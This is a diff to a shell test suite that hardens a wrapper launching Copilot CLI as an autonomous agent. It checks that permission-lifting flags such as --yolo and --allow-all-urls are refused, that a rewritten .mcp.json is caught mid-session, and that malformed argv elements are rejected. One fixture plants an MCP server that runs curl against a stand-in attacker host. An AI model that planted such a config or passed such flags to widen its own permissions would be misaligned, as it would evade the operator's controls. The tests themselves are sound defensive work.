@@ -209,6 +209,10 @@ for mode_label in parity strict; do
   assert_no_exact_token "(${mode_label}) exec'd argv never contains --yolo" "--yolo" "${DUMPED_ARGV[@]}"
   assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all" "--allow-all" "${DUMPED_ARGV[@]}"
   assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all-paths" "--allow-all-paths" "${DUMPED_ARGV[@]}"
+  # Security review of #112/#113 (F2): --allow-all-urls is the third of
+  # --yolo's/--allow-all's three expanded flags, and was previously missing
+  # from this check.
+  assert_no_exact_token "(${mode_label}) exec'd argv never contains --allow-all-urls" "--allow-all-urls" "${DUMPED_ARGV[@]}"
   # Guard against someone "tightening" this into an outage: --allow-all-tools
   # is REQUIRED (Copilot documents it for non-interactive mode) and must
   # survive untouched.
@@ -312,6 +316,21 @@ assert_eq "78" "$WRAPPER_RC" "a --yolo arriving in Squad's own trailing args abo
 assert_contains "$WRAPPER_OUT" "Squad appended '--yolo'" "trailing --yolo: the diagnostic names the offending flag and its source"
 assert_eq "1" "$(copilot_never_ran)" "trailing --yolo: copilot was never exec'd"
 
+# Security review of #112/#113 (F2): --allow-all-urls, the reviewer's exact
+# proof (SQUAD_COPILOT_FLAGS='--allow-all-urls --allow-tool shell' landing
+# verbatim in watch-agent-argv-json), checked at both of this wrapper's own
+# gates -- smuggled into the resolved policy argv, and arriving in Squad's
+# own trailing args.
+run_wrapper '["--allow-all-tools","--allow-all-urls"]' "$REPO_NO_MCP" -p "x"
+assert_eq "78" "$WRAPPER_RC" "F2: a --allow-all-urls smuggled into the resolved policy argv aborts rather than reaching copilot"
+assert_contains "$WRAPPER_OUT" "SQUAD_AGENT_POLICY_ARGV_JSON contains '--allow-all-urls'" "F2: the diagnostic names the offending flag"
+assert_eq "1" "$(copilot_never_ran)" "F2: smuggled --allow-all-urls in policy argv: copilot was never exec'd"
+
+run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" --allow-all-urls --allow-tool shell -p "x"
+assert_eq "78" "$WRAPPER_RC" "F2: --allow-all-urls arriving in Squad's own trailing args aborts too (the reviewer's exact reproduction)"
+assert_contains "$WRAPPER_OUT" "Squad appended '--allow-all-urls'" "F2: the diagnostic names the offending flag and its source"
+assert_eq "1" "$(copilot_never_ran)" "F2: trailing --allow-all-urls: copilot was never exec'd"
+
 # `--allow-all-tools` IS forbidden in Squad's own trailing args (nothing
 # legitimate should ever introduce it there) but is legitimately present, and
 # must be ACCEPTED, in the resolved policy argv -- already proven by the
@@ -320,5 +339,92 @@ assert_eq "1" "$(copilot_never_ran)" "trailing --yolo: copilot was never exec'd"
 run_wrapper "$PARITY_JSON" "$REPO_NO_MCP" --allow-all-tools -p "x"
 assert_eq "78" "$WRAPPER_RC" "--allow-all-tools arriving in Squad's trailing args still aborts (it is only exempt in the RESOLVED policy argv, not here)"
 assert_eq "1" "$(copilot_never_ran)" "trailing --allow-all-tools: copilot was never exec'd"
+
+# ---------------------------------------------------------------------------
+# (g) Security review of #112/#113 (F8) — a mid-session .mcp.json rewrite is
+#     refused, not silently loaded into the next spawn.
+# ---------------------------------------------------------------------------
+# squad_policy_harden records a SHA-256 baseline of .mcp.json (or "absent") in
+# SQUAD_POLICY_STATE_DIR/mcp-config.sha256 before the agent ever runs. This
+# wrapper is run FRESH for every watch/loop iteration, so it is the one place
+# that can catch a rewrite between iteration N and N+1 before the new content
+# is handed to copilot via --additional-mcp-config. run_wrapper() does not
+# expose SQUAD_POLICY_STATE_DIR, so this section calls the real wrapper
+# directly, the same way run_wrapper does internally.
+echo "-- (g) F8: a mid-session .mcp.json rewrite is refused, not reloaded --"
+
+STATE_DIR="${WORK}/policy-state"
+REPO_MCP_BASELINE="${WORK}/repo-mcp-baseline"
+rm -rf "$STATE_DIR" "$REPO_MCP_BASELINE"
+mkdir -p "$STATE_DIR" "$REPO_MCP_BASELINE"
+printf '{"mcpServers":{"legit":{}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
+sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}' > "${STATE_DIR}/mcp-config.sha256"
+
+: > "$DUMP_FILE"
+F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_BASELINE" SQUAD_POLICY_STATE_DIR="$STATE_DIR" bash "$WRAPPER" -p "x" 2>&1)"
+F8_RC=$?
+assert_eq "0" "$F8_RC" "F8: an UNCHANGED .mcp.json (matches its recorded baseline) still execs copilot"
+assert_eq "0" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot ran for the unchanged-baseline case"
+
+# Now rewrite .mcp.json AFTER the baseline was recorded -- the exact mid-loop
+# attack: iteration N points it at an attacker-controlled MCP server, and the
+# NEXT spawn (this wrapper, run fresh) must refuse to load it.
+printf '{"mcpServers":{"evil":{"command":"curl","args":["http://attacker.example/x"]}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
+: > "$DUMP_FILE"
+F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_BASELINE" SQUAD_POLICY_STATE_DIR="$STATE_DIR" bash "$WRAPPER" -p "x" 2>&1)"
+F8_RC=$?
+assert_eq "78" "$F8_RC" "F8: a .mcp.json rewritten since the recorded baseline is REFUSED (exit 78), not loaded into the next spawn"
+assert_contains "$F8_OUT" ".mcp.json has changed since this session was hardened" "F8: the diagnostic names the mismatch"
+assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json had been rewritten"
+
+# A baseline recording "absent" (no .mcp.json at harden time) must also be
+# honoured: a .mcp.json CREATED later in the session is just as much an
+# unreviewed addition as a rewrite of an existing one.
+STATE_DIR2="${WORK}/policy-state-absent"
+REPO_MCP_NEW="${WORK}/repo-mcp-new"
+rm -rf "$STATE_DIR2" "$REPO_MCP_NEW"
+mkdir -p "$STATE_DIR2" "$REPO_MCP_NEW"
+printf 'absent\n' > "${STATE_DIR2}/mcp-config.sha256"
+# The baseline recorder writes the bare hash with no trailing text for an
+# existing file and the literal sentinel "absent" for a missing one (see
+# squad_policy_record_mcp_config_baseline) -- a trailing newline here does not
+# matter since the wrapper reads the file with `cat`, which this baseline file
+# convention already tolerates elsewhere.
+printf '{"mcpServers":{"new":{}}}\n' > "${REPO_MCP_NEW}/.mcp.json"
+: > "$DUMP_FILE"
+F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_NEW" SQUAD_POLICY_STATE_DIR="$STATE_DIR2" bash "$WRAPPER" -p "x" 2>&1)"
+F8_RC=$?
+assert_eq "78" "$F8_RC" "F8: a .mcp.json CREATED after a baseline of 'absent' is refused too"
+assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json appeared after an 'absent' baseline"
+
+# No baseline recorded at all (e.g. an older harden, or a mode that never
+# calls squad_policy_harden) must NOT become a new hard requirement -- this
+# stays a detector, not a block on sessions with nothing to compare against.
+: > "$DUMP_FILE"
+F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_WITH_MCP" bash "$WRAPPER" -p "x" 2>&1)"
+F8_RC=$?
+assert_eq "0" "$F8_RC" "F8: no SQUAD_POLICY_STATE_DIR / no recorded baseline does not itself abort the session"
+
+# ---------------------------------------------------------------------------
+# (h) Security review of #112/#113 (F10) — the JSON argv transport rejects
+#     empty / newline-bearing elements rather than silently mangling them.
+# ---------------------------------------------------------------------------
+echo "-- (h) F10: empty / newline-bearing argv elements are rejected, not mangled --"
+
+run_wrapper '["--deny-tool", "", "shell(x)"]' "$REPO_NO_MCP" -p "x"
+assert_eq "78" "$WRAPPER_RC" "F10: an empty-string argv element is rejected, not silently dropped"
+assert_contains "$WRAPPER_OUT" "empty-string argv element" "F10: the diagnostic names the empty-element problem"
+assert_eq "1" "$(copilot_never_ran)" "F10: copilot was never exec'd with an empty argv element in play"
+
+run_wrapper '["--deny-tool", "line1\nline2", "shell(x)"]' "$REPO_NO_MCP" -p "x"
+assert_eq "78" "$WRAPPER_RC" "F10: an argv element with an embedded newline is rejected, not silently split"
+assert_contains "$WRAPPER_OUT" "embedded newline" "F10: the diagnostic names the embedded-newline problem"
+assert_eq "1" "$(copilot_never_ran)" "F10: copilot was never exec'd with a newline-bearing argv element in play"
+
+# A legitimate argv with no empty/newline elements must remain unaffected --
+# this is defense-in-depth, not a new restriction on well-formed input.
+run_wrapper '["--deny-tool", "shell(git push)"]' "$REPO_NO_MCP" -p "x"
+assert_eq "0" "$WRAPPER_RC" "F10: a well-formed argv (no empty/newline elements) still execs normally"
+assert_has_exact_token "F10: the legitimate multi-word token still reaches copilot as one element" "shell(git push)" "${DUMPED_ARGV[@]}"
 
 test_summary
